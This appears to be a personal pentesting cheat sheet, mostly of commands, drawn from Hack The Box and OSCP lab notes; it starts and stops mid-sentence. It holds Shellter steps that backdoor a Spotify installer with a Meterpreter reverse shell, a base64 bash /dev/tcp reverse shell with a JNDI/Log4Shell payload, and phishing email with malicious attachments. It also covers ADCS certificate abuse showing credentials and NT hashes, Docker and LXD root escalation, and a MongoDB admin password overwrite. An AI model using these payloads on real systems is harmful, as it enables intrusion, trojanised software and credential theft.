It is also revealed that TFTP uses the User Datagram Protocol (UDP) to communicate. 
This is defined as a lightweight data transport protocol that works on top of IP.
### UDP
UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to solve other problems that arise with packets, such as lost or out of order packets.
It is implemented in the transport layer of the OSI Model, known as a fast but not reliable protocol, unlike TCP, which is reliable, but slower then UDP.
Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and etcetera, the same way UDP has ports for protocols that work for UDP.

### Nikto
`nikto -C all -h 10.129.95.185`

# Misc
Create a webserver with node
`npx http-server -p 9999`
Disable the CSS/css by pasting the following into the dev tools console
`var el = document.querySelectorAll('style,link'); for (var i=0; i<el.length; i++) {el[i].parentNode.removeChild(el[i]);};`

`brew install mitmproxy`
`pip3 install mitmproxy2swagger # Plugin to scrape an api of all its endpoints`

#### Alias file for root
`/etc/profile.d/aliases.sh`
                                              

kali screen shots alias
- `alias shot='xfce4-screenshooter -r -s /home/kali/Desktop'`
----
# Reverseing 

## Binary investigation - First steps
Lets say you have a binary called `SuperBinary`. Things ot try:
- try a ton of a's `AAAAAAAAAAAAAA` as input (like 200 to crash to for buffer overflow)
- `strings SuperBinary` try strings on it to see what its got written and search around 
- `strings -e l SuperBinary` try strings with a differnt encodeing method 
- `strings -e s SuperBinary` # single-7-bit-byte characters (ASCII, ISO 8859, etc., default), 
- `strings -e S SuperBinary` # single-8-bit-byte characters, 
- `strings -e b SuperBinary` # 16-bit bigendian, 
- `strings -e 1 SuperBinary` # 16-bit littleendian, 
- `strings -e B SuperBinary` # 32-bit bigendian, 
- `strings -e L SuperBinary` # 32-bit littleendian. Useful for finding wide character strings. (l and b apply to, for example, Unicode UTF-16/UCS-2


Try and understand what the binary was compiled with; eg PyInstaller , which means we can use a tool such as [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) to extract its contents

This site worked but is dodge - https://ctfever.uniiem.com/en/tools/pyc-decompiler FIND ANOTHER WAY 

### Ghirda

After You have dragged the binary into a new project, you go to the annalyst tab , make option changes and run the analyser. 

See ther esults in the central "Listing Windows". this contains , diassemble listing , data and even images. Clickning functions her will update other windows. Ad the Show oever view to see some colours on the side.

On the right hanbd side you can see the decompile Windows which will show the source code decompiled of a fucntion.
ON the left hand you will see Program tree window, which contains the different sections from the ninary , eg  the bSS and data segment . 
Underneath that the Symbole Tree, Underneath that we see the data types window
At the bottom of the window is the console windows whishc OP the results of scripts etc

Another important window is the Bytes Windows ( Hex Dump window) To exporwe the binary as hex. Good to enable the asscii view by clicking on the small wrench.

Look for main and that will show you what its doing "mainly"
search for strings `search>For stings ...`
- Search for juicy strings
- Search for where it asked for inout data (eg password) and then click on the finding. it will take you too that part of the code.


TODO : PAth Hijack, path injection on ippsec.rocks


## Shellter ( windows PE injection )

[Shellter](https://www.shellterproject.com/) 

#### To set up 
Install wine, Shellter and a compatibility layer capable of running win32 applications on several POSIX-compliant operating systems.
```
sudo apt install wine
sudo apt install shellter
dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
```

```
# run with ...

shellter 
...
Choose Operation Mode - Auto/Manual (A/M/H): A
...
PE Target: /home/hacker/Downloads/SpotifySetup.exe
...
Enable Stealth Mode? (Y/N/H): Y
...
[1] Meterpreter_Reverse_TCP   [stager]
[2] Meterpreter_Reverse_HTTP  [stager]
...
Use a listed payload or custom? (L/C/H): L                                                                                  
Select payload by index: 1    
```
The above will have edited your windows PE in situ with the payload




#### Python Binary exstraction
 https://github.com/extremecoders-re/pyinstxtractor

```
┌──(kali㉿kali)-[~/Documents/REVERSING/SOCKET-HTB/app]
└─$ python3 pyinstxtractor/pyinstxtractor.py qreader 
[+] Processing qreader
[+] Pyinstaller version: 2.1+
[+] Python version: 3.10
[+] Length of package: 108535118 bytes
[+] Found 305 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_pyqt5.pyc
[+] Possible entry point: pyi_rth_setuptools.pyc
[+] Possible entry point: pyi_rth_pkgres.pyc
[+] Possible entry point: qreader.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.10 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: qreader

You can now use a python decompiler on the pyc files within the extracted directory
                                                                                          
```

The tool has extracted .pyc files, which are compiled bytecode files that are generated by the Python interpreter when a .py file is imported. We can now use a decompiler such as [unpyc3](https://github.com/greyblue9/unpyc37-3.10) to turn the .pyc files into Python source code

### exifttool
`exifttool` # revels meta data on any file eg;  the email of creator

- `exiftool -a -u brochure.pdf`
`-a` to display duplicated tags and `-u` to display unknown tags

### Swaks ( Swiss Arrmy Knife SNTP ??)
Send an email with multiple attachments ( OSCP Client Side attacks Capstone)
`swaks --to dave.wizard@supermagicorg.com --from test@supermagicorg.com --server 192.168.194.199 --auth-user test@supermagicorg.com --header "Subject: Click this" --body "This is a test email sent from the target machine." --attach @config.Library-ms --attach @automatic_configuration.lnk --attach @body.txt --suppress-data -ap`

### Gophish (phishing)
https://github.com/gophish/gophish - GoPhish is a Phishing Toolkit maintained by @jordan-wright, and will be used to deliver the
payload.

### Responder
The best tools for callbacks (especially from windows) is [Responder](https://github.com/lgandx/Responder), this will parse the packets properly for things like the password you are looking.
- `responder -I tun0`



### Empire 
https://github.com/EmpireProject/Empire - might be out of date mnow and mainteined elsewhere
The Empire post exploitation project is developed by @harmj0y, @sixdub, @enigma0x3, rvrsh3ll,
@killswitch_gui, and @xorrior, and is a good choice for generating the malicious .hta and
receiving the callback.


### Asset finder 
Passive OSINT search for domains 
`go install github.com/tomnomnom/assetfinder@latest`
`assetfinder --subs-only <DOMOAIN>`

### httprobe
Similar to whatweb.
`go install github.com/tomnomnom/httprobe@latest`

### tee
Splits the input , 1 to a file and 1 to the screen.
This will create a file of all the hosts which are up.
as per `cat domains.txt | httprobe | tee hostsUp.txt`
`tee -a` will append to the file.

### meg 
- `go install github.com/tomnomnom/meg@latest`
"fetch many paths for many hosts; fetching one path for all hosts before moving on to the next path and repeating."

Verbose mode , looking for the web root `/` , with a delay of 1 sec. hosts file needs to be called `hosts`.
- `meg -d 1000 -v /`

`TurboIntruder` is mega fast.

`grep -Hnri <TERM> *` , where...
- `H` = file name
- `n` = Line number
- `r` = recursive 
- `i` = case insensitive

`grep -Hnri wifi * | vim -` 
This will pipe it into a vim buffer which you could save/search/modify etc.

# Vim

### Vim macro to convert a list of names to possible usernames quickly
lets say you have a list of names
```sh
Fergus Smith 
Shaun Coins
Sophie Driver 
Bowie Taylor
Hugo Bear
Steven Kerb
```
1. start by pressing `q,a` which hmeans record the macro and it will start on `a`
2. Macro: `yy` t oyank the line
3. `3p` to paste the line 3 times 
4. hit home to get the cursor at the beginning
5. `/, ` <- SPACE , `.` , `esc` - This will swap the empty space for a `.`
6. home, right one,  `dw` for delete word 
7. home, right one,  `dw` for delete word, `i` for insert mode and put a `.` 
8. Down key, home , `esc` to exit insert mode
9. `q` to exit recording mode
10. pressing `@,a` on the next line will replay all the previous keys in steps 2-9
11. with 4 more lines to process we can just type `4@a` to do the rest of the

----


### Vim cmds from the buffer - and back into Vim!!
- `:%!sort -u` - sort things 
- `:%!grep -V <TERM>` - get rid of anything with `TERM`

- `Ctl + v` goes int ovisual block mode and you can highlight multiple bits of text
- `.` will repeat the last command

----


## Docker 
- `docker run --rm -v $(pwd):/data kalilinux/kali-rolling bash -c "apt update -y && apt install -y nmap && nmap -T5 lazbmx1mui5u0fi9spfaumrojfp6d11q.oastify.com -oA /data/output.txt"`

## Docker Privesc
Making use of a Linux image, preferably Alpine Linux as it is a lightweight Linux distribution. 
This Linux image can then be imported into docker and then we can mount the **host file system** with root privileges **onto the container file system** .
- `docker run -it -v /:/mnt alpine`
  - `-it` Interacgive terminal 
  - `-v /:/mnt` mount the hosts `/` to `/mnt` on the container
- then run `chroot .` in the `/mnt` dir which will set the containers host file system to that of the host file system


### Talk out of the docker container to the real worl, ( I think ) 
The hostname `host.docker.internal` is a special DNS name used within Docker containers to connect to services running on the Docker host. This is particularly useful for developers working on Docker for Mac and Docker for Windows, as it provides a way for containers to communicate with the host machine over the loopback network interface.

Here's how `host.docker.internal` works on different platforms:

Docker for Mac and Windows:
Docker for Mac: It resolves to the internal IP address used by the host, making it possible for the containers to connect to services running on the host machine.
Docker for Windows: Similar to Docker for Mac, it resolves to the internal IP address used by the host.
Docker for Linux:
As of my last update in September 2021, Linux doesn't natively support `host.docker.internal`. However, there are workarounds like manually adding a host entry to point to the host's external IP address or using a gateway IP.
Typical Uses:
Connecting to a database running on your local machine but not within a Docker container.
Connecting to any service which is running on the host but not inside a container.
Example:
Suppose you're running a web server on your local machine on port 8080 and you have a Docker container that needs to connect to this web server. Inside the Docker container, you could connect to http://host.docker.interna`:8080.

Note:
Using `host.docker.internal` bypasses any Docker networking isolation; it essentially allows the container to access the host's network. This is something to consider from a security perspective, particularly in production environments.

It's a handy feature for development and testing but use it carefully, keeping network security considerations in mind.


## Docker container escape

To go from a docker container to the host its best to first spawn an interactive shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh docker@172.17.0.1
```

Also If the config on the docker container reveals the ip address of 172.17.0.2.

When you encounter a container with the IP address 172.17.0.2, it usually indicates that this is the first container connected to the default Docker bridge network. By convention, the first IP address in a network segment is often reserved for the gateway of that network, which in this case is the Docker host's bridge interface. Therefore, if the container's IP is 172.17.0.2, the Docker host's bridge interface (often named docker0 on the host) usually has the IP address 172.17.0.1.

This setup allows the container to communicate with the host using the host’s IP address as a gateway. This is why, if the container has the IP address 172.17.0.2, it implies that the Docker host VM likely has the IP address 172.17.0.1, enabling network communications between the container and the host.

---

### Python venv (virtual enviroment)
`python3 -m venv .MY-VENV-PROJECT-DIR`
This command is used to create a virtual environment for Python projects. Here's what it does step by step:
python3 specifies that you're using Python 3 to execute the command.
- `-m venv` tells Python to use the `venv` module
- `.MY-VENV-PROJECT-DIR` is the name and location where the virtual environment will be created. 
Using a virtual environment helps maintain a clean, controlled, and consistent development or testing environment that matches the specific needs of each challenge or task.

---

### Ansible Vault

```sh
ansible2john FILE1 FILE3 FILE3  > ansible.hashes   # all three hashes can go into 1 file (From HTB AUTHORITY)

# On his cracken
./hashcat.bin --username ansible.hashes rockyou.txt  # this works and starts cracking ????
./hashcat.bin --username ansible.hashes rockyou.txt --show   

# This gives us the ansible.vault password which we can use to decrypt each cred
cat file1 | ansible-vault decrypt
```

---

### Rubeus 

Below will **give us the cert AND the NTLM hash** . We could have also used the ticket with psexec.
- `.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap` 
Then
- `cme smb <IP_ADDRESS> -u administrator -H <NTLM_HASH_DATA>`
Then
- `psexec.py -hashes <LM_HASH>:<NTLM_HASH> USERNAME@IP_ADDRESS` or 
- `psexec.py -hashes <NTLM_HASH>:<NTLM_HASH> USERNAME@IP_ADDRESS` the hashes can both be NTLM_HASH. Ippsec think its juts a regex thing on psexec.

### Certipy

ADCS is best done from the box rather than from a windows attack machine hence **Certipy**

```sh
certipy find -u <USERNAME> -p '<PASSWORD>' -target <DOMAIN-or-IP> -text -stdout -vulnerable`

-vulnerable           # Show only vulnerable certificate templates based on nested group memberships. Does not affect BloodHound output
-target               # DNS Name or IP Address of the target machine. Required for Kerberos or SSPI authentication
-text                 # Output result as text
-stdout               # Output result as text to stdout
```

With the vuln template we are creating a new ticket which we can use to log in as the Alt name (eg the admin)
- `certipy req -u <USERNAME> -p <PASSWORD> -upn <ALTERNATE_UserPrincipalName-eg-ADMIN> -target <DNS-or-IP> -ca <CA_NAME> -template <VULN_TEMPLATE>`


Auth with a `.pfx` file 
- `certipy auth -pfx administrator.pfx`


<details>
	<summary>Example Output</summary>

```sh

┌──(kali㉿kali)-[~]
└─$ certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'sequel.htb' at '10.129.215.135'
[+] Trying to resolve 'SEQUEL.HTB' at '10.129.215.135'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.215.135[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.215.135[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ certipy auth -pfx administrator.pfx                      
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee


─$ certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable 
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[!] Failed to resolve: authority.authority.htb
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: [Errno -2] Name or service not known
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via RRP: [Errno Connection error (authority.authority.htb:445)] [Errno -2] Name or service not known
[!] Failed to get CA configuration for 'AUTHORITY-CA'
[!] Failed to resolve: authority.authority.htb
[!] Got error while trying to check for web enrollment: [Errno -2] Name or service not known
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

</details>

We can also edit credential `.pfx` files like in openssl
To use pass the cert we need ot get the key out of the `administrator.pfx` file , which we can do with certipy
- `certipy cert -pfx administrator.pfx -nocert -out administrator.key`
we can do a similar thing to get justs the cert 
- `certipy cert -pfx administrator.pfx -nokey -out administrator.crt`


### ntpdate
- `sudo ntpdate <IP_ADDRESS_TO_SYNC_WITH>`
Sets the local date and time by polling the Network Time Protocol (NTP) servers specified to determine the correct time. If you get clock skew

---

# Misc tools yet to be reseach

https://github.com/frizb/PasswordDecrypts/blob/master/README.md
https://github.com/Hackplayers/
https://lolbas-project.github.io/#
https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-net-win64.zip
https://github.com/ricmoo/pyaes

# Source code Foo

## AI Improved Git repo interrogator - 1liner
`{ find .git/objects/pack/ -name "*.idx" | while read i; do git show-index < "$i" | awk '{print $2}'; done; find .git/objects/ -type f | grep -v '/pack/' | awk -F'/' '{print $(NF-1)$NF}';} | while read o; do git cat-file -p $o | grep -an SEARCH_TERM && echo "in object $o"; done`

It first finds all the `.idx` files under the `.git/objects/pack/` directory and prints out the object names (hashes) contained in these index files.
Then it finds all files under the `.git/objects/` directory excluding those under the `/pack/` subdirectory, and prints out their names as well.
All these object names are piped into git cat-file -p command to print the contents of these objects.
Finally, `grep -a SEARCH_TERM` is used to filter the output and print only lines containing the search term.
In order to list the files and line numbers where the "SEARCH_TERM" is found, we need to modify the command slightly:

## Git repo interrogator - 1liner
`{ find .git/objects/pack/ -name "*.idx" | while read i; do git show-index < "$i" | awk '{print $2}'; done; find .git/objects/ -type f | grep -v '/pack/' | awk -F'/' '{print $(NF-1)$NF}';} | while read o; do git cat-file -p $o;done | grep -a <TERM>`

```sh
#!/bin/bash
# pipe to "grep -a" which read binary files as text
{ 
    # find the idx files. idx files store where in the pack files the source code files are
    find .git/objects/pack/ -name "*.idx" |
    # send it to a var called "i"
    while read i; do 
        # take the name of the fie and input it into git-show index, and then get the 2nd colum of data ( the object hashes values)
        git show-index < "$i" | awk '{print $2}';  
    done;
    # find all the objects that haven't been packed
    find .git/objects/ -type f | grep -v '/pack/' |
    awk -F'/' '{print $(NF-1)$NF}';
    # pipe the output of the two commands (var o) in the curly braces to "while read"
} | while read o; do
    # ...and pretty print the content of each file with cat file
        git cat-file -p $o;done

```
### Search for "TERM" in all repos in this directory
`for d in $(pwd)/*/ ; do (cd "$d" && echo "Searching in $d" && git grep -n "TERM") done`

### Search by file type for "TERM" in all repos in this directory
`for d in $(pwd)/*/ ; do (cd "$d" && echo "Searching in $d" && git grep -n <TERM>  -- "*.json") done`

### GitHub Search Filters:
- **repo:**: Search in a specific repository.
- **org:**: Search within an organization.
- **user:**: Search within a user’s repositories.
- **filename:**: Search for files with a specific name.
- **extension:**: Search for files with a specific extension.
- **path:**: Search within a directory path.
- **size:**: Search by file size.
- **stars:**: Search by repository stars.
- **fork:**: Include/exclude forked repositories.
- **language:**: Search by programming language.
- **topic:**: Search by repository topics.
- **is:**: Search by state (open/closed).
- **label:**: Search by issue/PR label.
- **author:**: Search by issue/PR author.
- **assignee:**: Search by issue/PR assignee.
- **mentions:**: Search issues/PRs mentioning user.
- **commenter:**: Search by issue/PR commenter.
- **in:**: Search within title, body, or comments.
- **created:**: Search by creation date.
- **pushed:**: Search by push date.
- **updated:**: Search by update date.
- **type:**: Search by type (issue, PR).

### Shodan Search Filters:
- **hostname:**: Filter by hostname.
- **net:**: Filter by IP or CIDR.
- **port:**: Filter by open port.
- **os:**: Filter by operating system.
- **country:**: Filter by country code.
- **city:**: Filter by city name.
- **geo:**: Filter by geographic coordinates.
- **after:**: Filter by date after.
- **before:**: Filter by date before.
- **org:**: Filter by organization name.
- **isp:**: Filter by ISP name.
- **product:**: Filter by product name.
- **version:**: Filter by version number.
- **title:**: Filter by page title.
- **html:**: Filter by HTML content.
- **ssl:**: Filter by SSL details.
- **vuln:**: Filter by vulnerability.
- **tag:**: Filter by specific tags.
- **device:**: Filter by device type.

---

### Wayback urls
`go install github.com/tomnomnom/waybackurls@latest`
Usage:
- `echo bbc.com | waybackurls > bbc-Domains.txt`

### Unfurl
`go install github.com/tomnomnom/unfurl@latest`
Pulls out params and more from urls to make lists whihc can be used in fuzzing . and probably much more,

-----


### Codingo Reconoitre Tool 
- https://github.com/codingo/Reconnoitre
eg: `python Reconoitre.py -t <IP_ADDR> -o <pwd>  --services`
Look at the "Findings.txt fils
- `cat *find*`
I will suggest commands to run:
eg: `gobuster dir -u http://10.129.198.51 -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -t 20 -o GobusterOutput.txt -b ''`


### Jar files
Good tool for decompileing them is `jd-gui` (on homebrew too but could not get to run - java Vesion ??)
`jar` files are just zipped files.
Class files can be unpacked with a tool called "jad"
#### export and expand a jar file
On the listener side open a netcat and direct ot a file 
- `nc -lvnp 9001 > MyNewRecievedFiile.jar`
- on the server side send the file with `cat TARGET-JAR.jar > /dev/tcp/10.10.14.22/9001`
- Extract locally with `7z x MyNewRecievedFiile.jar`
- or `unzip -d /tmp/app TARGET-JAR.jar`
  
### Zip , gzip
- `zip -r <FILETOEXTRACT> $(find /path/to/files/ -name "*.jar")   # Recursive Zip up all the found .jar files`	
- `gzip allthejars $(ls -lR / | grep -H ".jar$" | grep -v "cannot open directory" | cut -d " " -f12) # `
	
## Fuzzing 
A Brute force attack using `wfuzz` and a reverse string match against the response text ( --hs "Unknown username," for string hiding). 
Since we are not trying to find a valid password, we can use a dummy password.
- `wfuzz -c -z file,<USERNAME_LIST_FILE> -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://VICTIM`

### Fuzzing for Subdomains
- `wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 10.129.27.128 -H "Host: FUZZ.shoppy.htb" --hc 301`

### Parameter fuzzing to find mass-assignment vulns
1. Find an interesting endpoint where you get denied if unauthed.
2. Do a vinalla request to test it works and check all the headers are sent the srever needs.Somet imes the `Accept:` header needs to be a precise kind. You might need ot add that header to your Fuzzer.
3. copy the url and create a fuzz parameter set to `=1` or `=true` or some randone string `=foo` or `=0&1`
4. run A fuzzer like fuff with `FUZZ=1` or `FUZZ=true` based on a possible list of ( for example) api endpoints 
5. look for `200`'s or something similar.


### Wfuzz Docker Container
See: https://hub.docker.com/r/dominicbreuker/wfuzz
- `docker run wfuzz:latest -c -z file,wordlist/general/big.txt --hc 404 http://www.target.com/FUZZ`

---

## FuFF
put FUZZ on the param

`fuff hashcat FILE.req -request-proto http -w Seclist_SpecialChars.txt`
`fuff -request FILE.req -request-proto http -w Seclist_SpecialChars.txt -fs INT -mc all -mr 'somestring'`

**WHERE:**
- `-request FILE.req` 		# request file ike sqlmap but you need to place FUZZ in the location
- `-request-proto http` 		# this is the request protocol to try
- `-w Seclist_SpecialChars.txt` 	# wordlist file, The seclists Special chars is a good one ot start with
- `-fs INT`  	 	        	# filter out size of response
- `-mc all` 	 		        # match codes eg 200 , this matches all so yo use everything!
- `-mr 'somestring'`	        # -mr == match regex so you can only return things you want to see based on ) for exampke ) a particlar error message)

**Also: **

- `ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://IPADDRESS/FUZZ -t 100 -recursion -recursion-depth 5 -o FFUF_urls.txt`
- `ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://IPADDRESS/FUZZ -t 100 -recursion -recursion-depth 3 -e .php,.txt,.html -v -o FFUF_urls.txt`

Q: what is entity encoding exactly?

# TIPS 
When ippsec sees params fail with:
- `{`, `[`, `(`   # It's more likly **SSTI**
- `",` ,`'`       # It's likly **Sqli**
- `;`, `|`, `&`   # It's likel **Command Injection**

----

## JNDI (HTB - Unified)
JNDI is the acronym for the Java Naming and Directory Interface API . By making calls to this API,
applications locate resources and other program objects. A resource is a program object that provides
connections to systems, such as database servers and messaging systems.

A malicious LDAP server for JNDI injection attacks. The project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.

- https://github.com/veracode-research/rogue-jndi

## LDAP
LDAP is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,
industry standard application protocol for accessing and maintaining distributed directory information
services over the Internet or a Network. The default port that LDAP runs on is port 389 .

### Commands from HTB Tier2 Unified - JNDI and LDAP attack
`sudo tcpdump -i tun0 port 389   # Check if we get a call back to our Fake ldap port.`
`sudo apt-get install openjdk-11-jdk -y # install the java 11 openjdk` 
`sudo apt-get install maven`
`git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package`
`echo 'bash -c bash -i >&/dev/tcp/MY_IP/4444 0>&1' | base64 # == YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTAyLzQ0NDQgMD4mMQo`
`java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,MY_B64_BLOB_FROM_ABOVE}|{base64,-d}|{bash,-i}" --hostname "MY_IP"`
- Set payload on the "Remember" Param in the post to : `${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}`

- on the reverse shell type `script /dev/null -c bash`
- `find / -type f -name user.txt # find the user flag`
- `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);" 	# Find all the users on a mongo DB`				
- `mkpasswd -m sha-512 Password1234 # Create a sha-512 hash of the PW "Password1234"   === $6$p9bSlPO06dPHfG9s$xsJXbX.RUKKnp2DIP/1qJY.kgT9cjrPQWYdx/iXP3KkEYtNAkf5JBCHOWor7vqcCzuLkOiw9Ar5TB3O6OAUAt0 `
- `mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<USER_ID_HASH>")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})' # Change the administrato PW to the PW above (hash)` 

### Regexes for vs code
`password(.*)"(.*)"`# find the term "password" followed by anything and then a pair of quotations marks with text within them
`auth(.*)"(.*)"`# find the term "auth" followed by anything and then a pair of quotations marks with text within them

### Finding secrets in code
`detect-secrets -C . scan > .secrets.basline` # Run detect secrts and make a basline file for the repo
`detect-secrets audit .secrets.baseline`

`trufflehog --regex <FULLPATHTOCODE>`

## gitLeaks

Find commit secrets leaked by running [gitleaks](https://github.com/gitleaks/gitleaks) **within** the source code repository as per:
- `gitleaks detect -v -f json -r ../GitleaksReport.json`

## tftp
Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. 
TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides.  
It is also revealed that TFTP uses the User Datagram Protocol (UDP) to communicate. 
This is defined as a lightweight data transport protocol that works on top of IP.

### udp 
UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to solve other problems that arise with packets, such as lost or out of order packets.
It is implemented in the transport layer of the OSI Model, known as a fast but not reliable protocol, unlike TCP, which is reliable, but slower then UDP.
Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and etcetera, the same way UDP has ports for protocols that work for UDP.

### LXD (htb: Included)
LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.

To REad - https://www.hackingarticles.in/lxd-privilege-escalation/

`Linux Container (LXC)` are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.

`Linux daemon (LXD)` is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.

- `apt install lxd`
- `apt install zfsutils-linux`
- `usermod --append --groups lxd Bob`
- `lxd init`
- `lxc launch ubuntu:18.04`
- `lxc list`

LXD Privesc
- `git clone  https://github.com/saghul/lxd-alpine-builder.git`
- `cd lxd-alpine-builder`
- `./build-alpine`
- `lxc init myimageNasty ignite -c security.privileged=true` - This security switch is key
- `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`
- `lxc start ignite`
- `lxc exec ignite /bin/sh`
- `id`


## URL Encoding
When making a request to a web server, the data that we send can only contain certain characters from the
standard 128 character ASCII set. Reserved characters that do not belong to this set must be encoded. For
this reason we use an encoding procedure that is called URL Encoding . With this process for instance, the reserved character `&` becomes `%26` .

## SSTI
Template engines are designed to generate web pages by combining fixed templates with volatile data. 
Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. 
This allows attackers to inject arbitrary template directives in order to manipulate the template engine, 
often enabling them to take complete control of the server.

Tool - https://github.com/epinna/tplmap

Node.js and Python web backend servers often make use of a software called "Template Engines".

SSTI - This is a good article - https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

#### Polyglot SSTI payload 
`${{>%[%'"}}%`  - If it is doing SSTI , this could make it crash. IF it prints. it is not SSTI injectiable


### What is a Template Engine?

Template Engines are used to display dynamically generated content on a web page. They replace the
variables inside a template file with actual values and display these values to the client (i.e. a user opening a
page through their browser).
For instance, if a developer needs to create a user profile page, which will contain Usernames, Emails,
Birthdays and various other content, that is very hard if not impossible to achieve for multiple different
users with a static HTML page. The template engine would be used here, along a static "template" that
contains the basic structure of the profile page, which would then manually fill in the user information and
display it to the user.
Template Engines, like all software, are prone to vulnerabilities. The vulnerability that we will be focusing on
today is called Server Side Template Injection (SSTI).

## What is an SSTI?
Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order
